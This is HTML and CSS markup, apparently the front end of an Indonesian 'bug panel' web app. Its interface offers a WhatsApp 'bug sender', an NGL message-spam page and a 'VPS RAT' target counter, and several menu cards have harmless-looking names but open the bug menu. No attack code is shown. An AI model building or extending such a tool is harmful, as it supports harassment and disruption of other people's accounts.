.bug-opt .opt-status{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.65rem;color:var(--red);margin-top:3px;}
.bug-opt.active .opt-status{color:#ffdf6b;}
.bug-opt .sender-tag{margin-top:8px;font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1.5px;background:var(--ink);color:#ffdf6b;padding:3px 9px;border-radius:8px;border:2px solid var(--ink);display:none;}
.bug-opt.active .sender-tag{background:var(--yellow);color:var(--ink);border-color:var(--ink);}
.bug-opt .sender-detail{font-family:'Courier New',monospace;font-size:.62rem;color:#fff;margin-top:4px;letter-spacing:.5px;word-break:break-all;display:none;}
.sender-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;}
.btn-send-bug{width:100%;padding:15px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.3rem;letter-spacing:3px;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);cursor:pointer;margin-top:16px;transition:transform .08s,box-shadow .08s;}
.btn-send-bug:active{transform:translate(5px,5px);box-shadow:1px 1px 0 var(--ink);}

.sender-mgmt-head{background:#0d0d18;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:14px;margin-bottom:12px;display:flex;align-items:center;gap:12px;position:relative;overflow:hidden;}
.sender-mgmt-head .lg{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#ffb300,#a67c00);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;}
.sender-mgmt-head .info{flex:1;min-width:0;}
.sender-mgmt-head .info .nm{font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:1.5px;color:#fff;line-height:1.05;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.sender-mgmt-head .info .sb{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:#8892b0;margin-top:2px;letter-spacing:1px;}
.sender-mgmt-head .active-badge{background:#d81b4a;color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:1.5px;padding:5px 10px;border-radius:8px;border:3px solid var(--ink);box-shadow:2px 2px 0 var(--ink);flex-shrink:0;}
.tips-box{background:#1a1a2a;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:10px 12px;margin-bottom:14px;display:flex;gap:10px;align-items:flex-start;}
.tips-box .ic{color:var(--red);font-size:1.1rem;flex-shrink:0;margin-top:2px;}
.tips-box .txt{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:#c8c8d8;line-height:1.45;}
.add-sender-card{position:relative;background:#0f0f1e;border:5px solid var(--red);box-shadow:7px 7px 0 var(--ink);padding:16px;margin-bottom:14px;border-radius:14px;}
.add-sender-tab{position:absolute;top:-14px;left:16px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:.75rem;letter-spacing:2px;padding:5px 12px;border-radius:8px;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);}
.add-sender-title{display:flex;align-items:center;gap:12px;margin:8px 0 16px;}
.add-sender-title .plus{width:44px;height:44px;border-radius:10px;background:var(--red);color:#fff;border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:bold;flex-shrink:0;font-family:'Bangers',Impact,sans-serif;}
.add-sender-title .ttl{font-family:'Bangers',Impact,sans-serif;font-size:1.4rem;letter-spacing:2px;color:#fff;-webkit-text-stroke:1px var(--ink);text-shadow:2px 2px 0 var(--ink);line-height:1;}
.wa-field-label{font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:2px;color:#fff;margin-bottom:8px;display:block;}
.wa-input-wrap{position:relative;display:flex;align-items:center;background:#050510;border:3px solid #1e1e30;box-shadow:inset 2px 2px 0 rgba(0,0,0,.6);margin-bottom:16px;}
.wa-input-wrap .prefix{padding:0 12px;color:var(--red);font-size:1.1rem;flex-shrink:0;border-right:2px solid #1e1e30;}
.wa-input-wrap input{flex:1;padding:14px 12px;background:transparent;border:none;outline:none;color:#fff;font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.95rem;letter-spacing:1px;min-width:0;}
.wa-input-wrap input::placeholder{color:#556;}
.petunjuk-box{background:#1a1a2a;border:3px solid #2a2a40;border-radius:10px;padding:12px;margin-bottom:16px;}
.petunjuk-box h6{font-family:'Bangers',Impact,sans-serif;font-size:.85rem;letter-spacing:1.5px;color:#fff;margin-bottom:8px;}
.petunjuk-box h6::before{content:"💡";font-size:1rem;margin-right:6px;}
.petunjuk-box ul{list-style:none;padding:0;margin:0;}
.petunjuk-box li{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:#a8b2d1;line-height:1.5;padding-left:12px;position:relative;margin-bottom:5px;}
.petunjuk-box li::before{content:"•";position:absolute;left:0;color:var(--red);font-weight:bold;}
.btn-row-2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
.btn-batal{padding:13px;background:#1e1e30;color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:2px;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);cursor:pointer;border-radius:10px;}
.btn-batal:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
.btn-lanjutkan{padding:13px;background:var(--red);color:#fff;font-family:'Bangers',Impact,sans-serif;font-size:1.05rem;letter-spacing:2px;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);cursor:pointer;border-radius:10px;}
.btn-lanjutkan:active{transform:translate(4px,4px);box-shadow:1px 1px 0 var(--ink);}
.btn-add-first{display:block;width:100%;padding:14px;margin:0 auto 14px;background:#d81b4a;color:#fff;max-width:280px;font-family:'Bangers',Impact,sans-serif;font-size:1.1rem;letter-spacing:2px;border:5px solid var(--ink);box-shadow:5px 5px 0 var(--ink);cursor:pointer;border-radius:12px;}
.btn-add-first:active{transform:translate(5px,5px);box-shadow:1px 1px 0 var(--ink);}
.btn-new-sender{width:100%;max-width:280px;padding:12px;margin:0 auto 10px;background:linear-gradient(135deg,#ffb300,#a67c00);color:var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:2px;border:5px solid var(--ink);box-shadow:5px 5px 0 var(--ink);cursor:pointer;border-radius:12px;display:none;align-items:center;justify-content:center;gap:6px;}
.btn-new-sender:active{transform:translate(5px,5px);box-shadow:1px 1px 0 var(--ink);}
.btn-new-sender.show{display:flex;}
.sender-list{display:flex;flex-direction:column;gap:8px;margin-bottom:14px;}
.sender-item{background:#0f0f1e;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);border-radius:10px;padding:12px;display:flex;align-items:center;gap:12px;}
.sender-item .dot{width:10px;height:10px;border-radius:50%;background:#00e676;box-shadow:0 0 8px #00e676;flex-shrink:0;}
.sender-item .info{flex:1;min-width:0;}
.sender-item .info .num{font-family:'Bangers',Impact,sans-serif;font-size:1rem;letter-spacing:1.5px;color:#fff;}
.sender-item .info .st{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.7rem;color:#00e676;margin-top:2px;}
.sender-item .del{background:#3a1a20;border:3px solid var(--ink);color:var(--red);font-family:'Bangers',Impact,sans-serif;font-size:.7rem;letter-spacing:1px;padding:6px 10px;border-radius:6px;cursor:pointer;box-shadow:2px 2px 0 var(--ink);}
.sender-item .del:active{transform:translate(2px,2px);box-shadow:0 0 0 var(--ink);}

.popup-overlay{position:absolute;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(8px);display:none;justify-content:center;align-items:center;z-index:100;padding:20px;}
.popup-overlay.active{display:flex;animation:popIn .35s;}
@keyframes popIn{from{opacity:0}to{opacity:1}}
.popup-box{width:100%;max-width:380px;background:var(--yellow);background-image:radial-gradient(circle, rgba(0,0,0,.85) 1.2px, transparent 1.4px),radial-gradient(circle, rgba(0,0,0,.85) 1.2px, transparent 1.4px);background-size:12px 12px,12px 12px;background-position:0 0,6px 6px;border:6px solid var(--ink);box-shadow:10px 10px 0 var(--ink);padding:18px 14px;text-align:center;transform:rotate(-.5deg);max-height:calc(100% - 40px);overflow-y:auto;position:relative;}
.popup-skull{font-size:3rem;line-height:1;display:inline-block;margin-bottom:4px;filter:drop-shadow(4px 4px 0 var(--ink));position:relative;z-index:1;}
.popup-box h4{font-family:'Bangers',Impact,sans-serif;font-size:1.6rem;letter-spacing:2.5px;color:var(--red);-webkit-text-stroke:1.5px var(--ink);text-shadow:3px 3px 0 var(--ink);margin-bottom:4px;position:relative;z-index:1;}
.popup-sub{font-family:'Bangers',Impact,sans-serif;font-size:.8rem;color:var(--ink);letter-spacing:2px;margin-bottom:12px;position:relative;z-index:1;}
.popup-sub b{color:var(--red);}
.method-track{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:12px;position:relative;z-index:1;}
.method-box{background:var(--paper);border:3px solid var(--ink);box-shadow:2px 2px 0 var(--ink);padding:8px 4px;text-align:center;transition:all .25s;position:relative;}
.method-box .mnum{font-family:'Bangers',Impact,sans-serif;font-size:1.1rem;color:var(--ink);line-height:1;}
.method-box .mname{font-family:'Bangers',Impact,sans-serif;font-size:.55rem;letter-spacing:.5px;color:var(--ink);margin-top:3px;line-height:1.1;min-height:20px;}
.method-box.active-load{background:var(--yellow);animation:pulseBox .5s infinite;}
.method-box.filled{background:var(--green);color:#fff;}
.method-box.filled .mnum,.method-box.filled .mname{color:#fff;}
.method-box.error{background:var(--red);color:#fff;}
.method-box.error .mnum,.method-box.error .mname{color:#fff;}
@keyframes pulseBox{0%,100%{transform:scale(1);}50%{transform:scale(1.06);}}

.term-output{background:#0a0a14;border:4px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:10px;margin-bottom:12px;text-align:left;height:180px;overflow-y:auto;border-radius:6px;position:relative;z-index:1;font-family:'Courier New',monospace;}
.term-output::-webkit-scrollbar{width:6px;}
.term-output::-webkit-scrollbar-track{background:#000;}
.term-output::-webkit-scrollbar-thumb{background:#00ff88;border-radius:3px;}
.term-output .tline{font-family:'Courier New',monospace;font-size:.7rem;color:#00ff88;line-height:1.55;margin-bottom:2px;white-space:pre-wrap;word-break:break-word;}
.term-output .tline.warn{color:#ffcc00;}
.term-output .tline.err{color:#ff5252;}
.term-output .tline.ok{color:#00e676;font-weight:700;}
.term-output .tline.dim{color:#666;}
.term-output .tline.info{color:#00d2ff;}
.term-output .tline::before{content:"$ ";color:#555;}
.term-output .tline.noprefix::before{content:"";}

.method-status{font-family:'Bangers',Impact,sans-serif;font-size:.95rem;letter-spacing:1.5px;color:var(--ink);margin-bottom:10px;min-height:20px;position:relative;z-index:1;}
.method-status.running{color:var(--red);}
.method-status.done{color:var(--green);}

.progress-bar-wrap{background:var(--paper);border:3px solid var(--ink);box-shadow:3px 3px 0 var(--ink);height:24px;margin-bottom:12px;overflow:hidden;position:relative;z-index:1;}
.progress-bar-fill{height:100%;width:0%;background:repeating-linear-gradient(45deg,var(--red),var(--red) 8px,#ff4d6a 8px,#ff4d6a 16px);transition:width .25s linear;position:relative;}
.progress-bar-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Bangers',Impact,sans-serif;font-size:.9rem;letter-spacing:2px;color:var(--ink);text-shadow:1px 1px 0 #fff,-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff;z-index:2;}

.ngl-popup-box{background:#12121c !important;background-image:none !important;border:5px solid var(--red) !important;box-shadow:10px 10px 0 #000 !important;transform:none !important;padding:18px 16px !important;color:#fff;}
.ngl-popup-box h4{color:#ff4d6a !important;-webkit-text-stroke:0 !important;text-shadow:none !important;font-family:'Poppins',sans-serif !important;font-weight:900 !important;letter-spacing:2px !important;font-size:1.4rem !important;}
.ngl-popup-box .popup-sub{color:#8892b0 !important;font-family:'Poppins',sans-serif !important;font-weight:600 !important;letter-spacing:1px !important;font-size:.75rem !important;}
.ngl-popup-box .popup-sub b{color:#00d2ff !important;}

.ngl-stat-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;position:relative;z-index:1;}
.ngl-stat-cell{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px 6px;text-align:center;}
.ngl-stat-cell .lbl{font-family:'Poppins',sans-serif;font-weight:500;font-size:.65rem;color:#8892b0;line-height:1.2;}
.ngl-stat-cell .val{font-family:'Poppins',sans-serif;font-weight:900;font-size:1.4rem;margin-top:4px;line-height:1;}
.ngl-stat-cell.ok .val{color:#00e676;}
.ngl-stat-cell.err .val{color:#ff4d6a;}
.ngl-stat-cell.prog .val{color:#00d2ff;}

.ngl-progress-wrap{background:#05050a;border:2px solid #1e1e30;border-radius:10px;height:22px;overflow:hidden;position:relative;margin-bottom:12px;z-index:1;}
.ngl-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4d6a,#ff8a3d);transition:width .3s linear;box-shadow:0 0 12px rgba(255,77,106,.6);}
.ngl-progress-text{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-weight:700;font-size:.75rem;color:#fff;letter-spacing:1px;text-shadow:0 0 6px #000;}

.ngl-term{background:#05050a;border:2px solid #1e1e30;border-radius:10px;padding:10px;text-align:left;height:160px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.68rem;line-height:1.5;margin-bottom:14px;position:relative;z-index:1;}
.ngl-term::-webkit-scrollbar{width:5px;}
.ngl-term::-webkit-scrollbar-thumb{background:#ff4d6a;border-radius:3px;}
.ngl-term .nll{color:#8892b0;margin-bottom:2px;word-break:break-word;}
.ngl-term .nll.ok{color:#00e676;}
.ngl-term .nll.err{color:#ff4d6a;}
.ngl-term .nll.info{color:#00d2ff;}
.ngl-term .nll.warn{color:#ffcc00;}

.ngl-btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;position:relative;z-index:1;}
.ngl-btn-row button{padding:12px;border-radius:10px;font-family:'Poppins',sans-serif;font-weight:700;font-size:.85rem;cursor:pointer;border:none;letter-spacing:1px;}
.ngl-btn-row .stop{background:#2a2a3a;color:#fff;}
.ngl-btn-row .close{background:#ff4d6a;color:#fff;}
.ngl-btn-row button:active{transform:scale(.97);}

.delivery-report{display:none;background:#fff;border:5px solid var(--ink);box-shadow:7px 7px 0 var(--ink);padding:14px;margin-top:14px;text-align:left;border-radius:8px;position:relative;z-index:1;transform:rotate(-.4deg);}
.delivery-report.show{display:block;animation:reportIn .5s cubic-bezier(.16,1,.3,1);}
@keyframes reportIn{0%{opacity:0;transform:rotate(-.4deg) translateY(20px) scale(.85);}100%{opacity:1;transform:rotate(-.4deg) translateY(0) scale(1);}}
.report-header{background:var(--green);color:#fff;border:4px solid var(--ink);box-shadow:3px 3px 0 var(--ink);padding:8px 12px;margin:-14px -14px 12px -14px;font-family:'Bangers',Impact,sans-serif;font-size:1.15rem;letter-spacing:2px;text-align:center;}
.report-header.fail{background:var(--red);}
.report-badge{display:inline-block;background:var(--yellow);color:var(--ink);font-family:'Bangers',Impact,sans-serif;font-size:.65rem;letter-spacing:1.5px;padding:2px 8px;border-radius:6px;border:2px solid var(--ink);margin-bottom:8px;}
.report-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:2px dashed rgba(0,0,0,.15);}
.report-row:last-child{border-bottom:none;}
.report-row .k{font-family:'Bangers',Impact,sans-serif;font-size:.72rem;letter-spacing:1.5px;color:var(--ink);opacity:.75;}
.report-row .v{font-family:'Courier New',monospace;font-size:.75rem;font-weight:700;color:var(--ink);text-align:right;word-break:break-all;max-width:60%;}
.report-row .v.good{color:var(--green);}
.report-row .v.warn{color:var(--red);}
.report-desc{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.72rem;color:var(--ink);line-height:1.5;background:#fff6d6;border:3px solid var(--ink);padding:8px 10px;margin-top:10px;border-radius:6px;}
.report-desc .hl{background:var(--yellow);padding:1px 4px;border-radius:3px;}

.pairing-box{display:none;background:#fff;border:5px solid var(--ink);box-shadow:6px 6px 0 var(--ink);padding:14px;margin-top:12px;text-align:center;border-radius:8px;position:relative;z-index:1;}
.pairing-box.show{display:block;animation:popIn .4s;}
.pairing-box .lbl{font-family:'Bangers',Impact,sans-serif;font-size:.9rem;letter-spacing:2px;color:var(--red);margin-bottom:6px;}
.pairing-box .code{font-family:'Courier New',monospace;font-size:2rem;font-weight:900;letter-spacing:6px;color:var(--ink);padding:10px;background:var(--yellow);border:3px solid var(--ink);box-shadow:inset 2px 2px 0 rgba(0,0,0,.15);border-radius:6px;margin-bottom:8px;word-break:break-all;}
.pairing-box .hint{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.7rem;color:var(--ink);line-height:1.5;}

.wa-toast{position:absolute;top:12px;left:12px;right:12px;background:#fff;border:4px solid var(--ink);box-shadow:6px 6px 0 var(--ink);border-radius:12px;padding:10px 12px;display:none;align-items:center;gap:10px;z-index:200;transform:translateY(-120%);}
.wa-toast.show{display:flex;animation:toastDrop .5s forwards;}
@keyframes toastDrop{0%{transform:translateY(-120%);}100%{transform:translateY(0);}}
.wa-toast.hide{animation:toastUp .4s forwards;}
@keyframes toastUp{0%{transform:translateY(0);opacity:1;}100%{transform:translateY(-120%);opacity:0;}}
.wa-toast .wa-ico{width:36px;height:36px;border-radius:50%;background:#25D366;color:#fff;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;border:3px solid var(--ink);box-shadow:2px 2px 0 var(--ink);}
.wa-toast .wa-body{flex:1;min-width:0;}
.wa-toast .wa-body .t{font-family:'Bangers',Impact,sans-serif;font-size:.85rem;letter-spacing:1.5px;color:var(--ink);}
.wa-toast .wa-body .m{font-family:'Comic Neue',sans-serif;font-weight:700;font-size:.7rem;color:#444;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}

#spam-ngl-page{background:#05050a;padding:12px;padding-bottom:calc(var(--nav-h) + 30px);min-height:100%;}
.ngl-topbar{display:flex;align-items:center;gap:12px;padding:8px 4px 16px;}
.ngl-back{width:36px;height:36px;border-radius:8px;background:transparent;border:none;color:#fff;font-size:1.3rem;display:flex;align-items:center;justify-content:center;cursor:pointer;}
.ngl-topbar h2{font-family:'Poppins',sans-serif;font-weight:700;font-size:1.15rem;color:#fff;display:flex;align-items:center;gap:10px;}
.ngl-topbar h2 .ngl-icon{width:28px;height:28px;border-radius:6px;background:var(--red);display:flex;align-items:center;justify-content:center;font-size:1rem;color:#fff;}
.ngl-info-card{background:#12121c;border:1.5px solid var(--red);border-radius:14px;padding:14px;margin-bottom:14px;display:flex;gap:12px;align-items:flex-start;}
.ngl-info-card .info-icon{width:44px;height:44px;border-radius:10px;background:rgba(233,30,60,.15);display:flex;align-items:center;justify-content:center;font-size:1.5rem;flex-shrink:0;}
.ngl-info-card .info-body h3{font-family:'Poppins',sans-serif;font-weight:700;font-size:.95rem;color:#fff;margin-bottom:4px;line-height:1.3;}
.ngl-info-card .info-body p{font-family:'Poppins',sans-serif;font-weight:400;font-size:.75rem;color:#8892b0;line-height:1.5;}
.ngl-form-card{background:#12121c;border:1.5px solid #1e1e30;border-radius:14px;padding:16px;margin-bottom:14px;}
.ngl-label{font-family:'Poppins',sans-serif;font-weight:700;font-size:.85rem;color:#fff;display:flex;align-items:center;gap:8px;margin-bottom:10px;}
.ngl-label .dot-icon{color:var(--red);font-size:1rem;}
.ngl-label .random-btn{margin-left:auto;color:#00d2ff;font-weight:600;font-size:.78rem;cursor:pointer;background:none;border:none;font-family:'Poppins',sans-serif;}
.ngl-input-wrap{display:flex;align-items:center;gap:10px;background:#050510;border:1.5px solid #1e1e30;border-radius:10px;padding:12px 14px;}
.ngl-input-wrap .prefix{color:var(--red);font-size:1.1rem;flex-shrink:0;}
.ngl-input-wrap input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-family:'Poppins',sans-serif;font-weight:400;font-size:.85rem;min-width:0;}
.ngl-input-wrap input::placeholder{color:#5a5478;}
.ngl-textarea-wrap{background:#050510;border:1.5px solid #1e1e30;border-radius:10px;padding:12px 14px;min-height:110px;display:flex;}
.ngl-textarea-wrap textarea{width:100%;background:transparent;border:none;outline:none;color:#fff;font-family:'Poppins',sans-serif;font-weight:400;font-size:.85rem;resize:none;line-height:1.5;}
.ngl-textarea-wrap textarea::placeholder{color:#5a5478;}
.ngl-count-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px;}
.ngl-count-btn{padding:12px 4px;background:#12121c;border:1.5px solid #1e1e30;border-radius:10px;color:#fff;font-family:'Poppins',sans-serif;font-weight:600;font-size:.78rem;cursor:pointer;transition:all .2s;text-align:center;}
.ngl-count-btn.active{background:var(--red);border-color:var(--red);color:#fff;box-shadow:0 0 20px rgba(233,30,60,.4);}
.ngl-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:14px;}
.ngl-stat{background:#12121c;border:1.5px solid #1e1e30;border-radius:12px;padding:14px 8px;text-align:center;}
.ngl-stat.sukses{border-color:rgba(0,230,118,.3);}
.ngl-stat.gagal{border-color:rgba(233,30,60,.3);}
.ngl-stat.batch{border-color:rgba(0,210,255,.3);}
.ngl-stat .lbl{font-family:'Poppins',sans-serif;font-weight:500;font-size:.7rem;color:#8892b0;line-height:1.3;}
.ngl-stat .val{font-family:'Poppins',sans-serif;font-weight:900;font-size:1.6rem;margin-top:6px;line-height:1;}
.ngl-stat.sukses .val{color:#00e676;}
.ngl-stat.gagal .val{color:var(--red);}
.ngl-stat.batch .val{color:#00d2ff;}
.ngl-start-btn{width:100%;padding:16px;background:var(--red);border:none;border-radius:12px;color:#fff;font-family:'Poppins',sans-serif;font-weight:700;font-size:1rem;display:flex;align-items:center;justify-content:center;gap:10px;cursor:pointer;margin-bottom:14px;box-shadow:0 6px 20px rgba(233,30,60,.4);transition:transform .1s;}
.ngl-start-btn:active{transform:scale(.98);}
.ngl-start-btn:disabled{opacity:.6;cursor:wait;}
.ngl-log-card{background:#12121c;border:1.5px solid #1e1e30;border-radius:14px;padding:12px 14px;}
.ngl-log-card h4{font-family:'Poppins',sans-serif;font-weight:700;font-size:.85rem;color:#00d2ff;display:flex;align-items:center;gap:8px;margin-bottom:10px;}
.ngl-log-body{background:#05050a;border-radius:8px;padding:10px;max-height:130px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.7rem;line-height:1.5;}
.ngl-log-body .log-line{color:#8892b0;margin-bottom:2px;}
.ngl-log-body .log-line.ok{color:#00e676;}
.ngl-log-body .log-line.err{color:var(--red);}
.ngl-log-body .log-line.info{color:#00d2ff;}
.ngl-log-body .log-line.warn{color:#ffcc00;}

.bottom-navbar{position:absolute;bottom:0;left:0;width:100%;height:var(--nav-h);background:#fff6d6;border-top:5px solid var(--ink);display:flex;justify-content:space-around;align-items:center;z-index:20;padding-bottom:env(safe-area-inset-bottom,0);box-sizing:content-box;flex-shrink:0;}
.nav-tab{display:flex;flex-direction:column;align-items:center;font-family:'Bangers',Impact,sans-serif;font-size:.65rem;letter-spacing:1px;color:var(--ink);cursor:pointer;padding:4px 8px;}
.nav-tab .ic{font-size:1.2rem;line-height:1;}
.nav-tab.active{color:var(--red);}
.nav-tab-wa{width:52px;height:52px;background:var(--red);border:4px solid var(--ink);border-radius:50%;display:flex;justify-content:center;align-items:center;margin-top:-24px;box-shadow:0 4px 0 var(--ink);cursor:pointer;}
.nav-tab-wa:active{transform:translateY(2px);box-shadow:0 2px 0 var(--ink);}
.view-section::-webkit-scrollbar{display:none;}
</style>
</head>
<body>

<div id="login-view">
  <div class="login-card">
    <h2>Login</h2>
    <form class="form-container" id="loginForm" onsubmit="return doLogin(event)">
      <div class="input-box"><input type="text" id="loginUser" placeholder="username" required autocomplete="off"></div>
      <div class="input-box"><input type="password" id="loginPass" placeholder="password" required autocomplete="off"><span class="eye" onclick="toggleEye()">👁</span></div>
      <div class="options">
        <label class="remember-me"><input type="checkbox" checked> Remember Me</label>
        <a href="#" class="forgot-pass" onclick="return false">Forgot password?</a>
      </div>
      <div class="login-error" id="loginError"></div>
      <button type="submit" class="btn-login">Log in</button>
      <div class="register-link">Don't have an account? <a href="#" onclick="return false">Register Here!</a></div>
      <div class="demo-hint">Username <b>bebas</b> · password <b>min 1 karakter</b></div>
    </form>
  </div>
</div>

<div class="app-container" id="appContainer" style="display:none;">

  <div class="wa-toast" id="waToast">
    <div class="wa-ico">💬</div>
    <div class="wa-body">
      <div class="t">WhatsApp</div>
      <div class="m" id="waToastMsg">Pairing code berhasil dikirim</div>
    </div>
  </div>

  <div id="dashboard-1" class="view-section active comic-bg">
    <div class="hero-panel">
      <img src="https://images.unsplash.com/photo-1578632767115-351597cf2477?auto=format&fit=crop&w=300&q=80" class="hero-avatar" alt="Hero">
      <h1>REVOLT SINTAX</h1>
      <div class="sub">★ BUG PANEL — ELEGANT EDITION ★</div>
    </div>
    <div class="comic-panel">
      <div class="comic-section-title">STATUS REVOLT</div>
      <div class="avatar-scroll">
        <div class="avatar-item"><div class="avatar-circle">+</div><span>BUAT</span></div>
        <div class="avatar-item"><div class="avatar-circle">Z</div><span>RENZ13</span></div>
        <div class="avatar-item"><div class="avatar-circle">X</div><span>SYANBOSS</span></div>
        <div class="avatar-item"><div class="avatar-circle">Z</div><span>SKTGANZ</span></div>
        <div class="avatar-item"><div class="avatar-circle">R</div><span>REVOLT00</span></div>
      </div>
    </div>
    <div class="comic-panel">
      <div class="user-row">
        <div class="avatar-box" id="userInitial">R</div>
        <div class="info"><h4 id="userNameDisplay">RAJA ⭐</h4><span class="badge-reseller">RESELLER</span></div>
        <div class="temp-badge">29°C 📍</div>
      </div>
      <div class="vps-grid">
        <div class="vps-box"><h5>VPS REVOLT</h5><p>RAM: 8.3GB / 32GB</p><p>CPU: 1.40</p></div>
        <div class="vps-box"><h5>VPS RAT</h5><p>RAM: 281.0 MB</p><p>Target: 311/445</p></div>
      </div>
    </div>
    <div class="quick-header"><div class="quick-title">QUICK ACTIONS <span style="color:#00d2ff;">●</span></div><div class="view-toggle"><span class="on">🔲 GRID</span><span>▤ SLIDE</span></div></div>
    <div class="menu-grid">
      <div class="menu-card mc-red" onclick="openBugMenu()"><div class="tag-pill">STREAM</div><div class="icon-box">▶</div><h4>NEXTUBE PRO</h4><p>Streaming Anti-Iklan HD</p></div>
      <div class="menu-card mc-green" onclick="openBugMenu()"><div class="tag-pill">KALORI</div><div class="icon-box">🍴</div><h4>HITCAL AI</h4><p>Smart Nutrition & Kalori</p></div>
      <div class="menu-card mc-orange" onclick="openBugMenu()"><div class="tag-pill">BMKG</div><div class="icon-box">◎</div><h4>INDONESIA ZONE</h4><p>BMKG Gempa, Cuaca & Info</p></div>
      <div class="menu-card mc-cyan" onclick="openBugMenu()"><div class="tag-pill">ANTIVIRUS</div><div class="icon-box">🛡</div><h4>VIRUS SCAN PRO</h4><p>Deep Malware & System Scan</p></div>
      <div class="menu-card mc-pink" onclick="openBugMenu()"><div class="tag-pill">MONEY</div><div class="icon-box">💵</div><h4>TABUNGANKU</h4><p>Catatan & Kelola Keuangan</p></div>
      <div class="menu-card mc-yellow" onclick="openBugSender()"><div class="tag-pill">SENDER</div><div class="icon-box">🐛</div><h4>BUG SENDER</h4><p>WhatsApp Multi-Device</p></div>
      <div class="menu-card mc-orange2" onclick="openChatRoom()"><div class="tag-pill">CHAT</div><div class="icon-box">💬</div><h4>CHAT ROOM</h4><p>Global Communication</p></div>
      <div class="menu-card mc-dark" onclick="openBugMenu()"><div class="tag-pill">GITHUB</div><div class="icon-box">&lt;/&gt;</div><h4>REPO GITHUB</h4><p>Github Repo Manager</p></div>
      <div class="menu-card mc-purple" onclick="openBugMenu()"><div class="tag-pill">TEST</div><div class="icon-box">&lt;/&gt;</div><h4>TES FUNC</h4><p>Test Function & Payload</p></div>
      <div class="menu-card mc-maroon" onclick="openBugMenu()"><div class="tag-pill">DOC TOOLS</div><div class="icon-box">📄</div><h4>PLANNER PDF</h4><p>Photo to PDF, Converter</p></div>
    </div>
    <div class="comic-panel">
      <div class="sholat-header"><div class="sholat-title">🏠 JADWAL SHOLAT</div><div class="sholat-next">Next: <b>Dzuhur</b> in 00:15:12</div></div>
      <div class="sholat-grid">
        <div class="sholat-item"><div class="ic">🌙</div><div class="nm">SUBUH</div><div class="tm">04:32</div></div>
        <div class="sholat-item active"><div class="ic">☀️</div><div class="nm">DZUHUR</div><div class="tm">12:08</div></div>
        <div class="sholat-item"><div class="ic">🌤️</div><div class="nm">ASHAR</div><div class="tm">15:30</div></div>
      </div>
    </div>
    <div class="comic-panel">
      <div class="news-header"><div class="news-title">📰 BERITA TERKINI</div><div class="news-all">All Berita ›</div></div>
      <div class="news-box">
        <div class="news-img"><span>📰</span><div class="badge">BACA</div></div>
        <div class="news-body">
          <div class="ttl">Prabowo Dapat Laporan 209 Ha Lahan Masih Terbakar, Seskab Ungkap Ini</div>
          <div class="meta">🕐 Berita terbaru</div>
        </div>
      </div>
    </div>
  </div>

  <div id="dashboard-2" class="view-section comic-bg">
    <div class="header-panel"><div class="menu-btn">☰ MENU</div><div class="music-pill">🎵 SinTax SOUND</div></div>
    <div class="bug-header-panel">
      <h3>BUG MENU</h3>
      <div class="status-badges"><span class="badge-online">● ONLINE v2.0</span><span class="badge-edition">Elegant Edition</span></div>
    </div>
    <div class="tab-nav">
      <button class="tab-btn" onclick="setTab(this)">GESER</button>
      <button class="tab-btn active" onclick="setTab(this)">SCROLL</button>
      <button class="tab-btn" onclick="setTab(this)">ORBIT</button>
    </div>
    <div class="bug-card">
      <div class="bug-card-head">
        <div><div class="bug-title">SinTax BUG</div><div class="bug-sub">Bug tanpa custom</div></div>
        <div style="text-align:right;"><span class="tag-rec">RECOMMENDED</span><br><span class="tag-mod">MOD - 01</span></div>
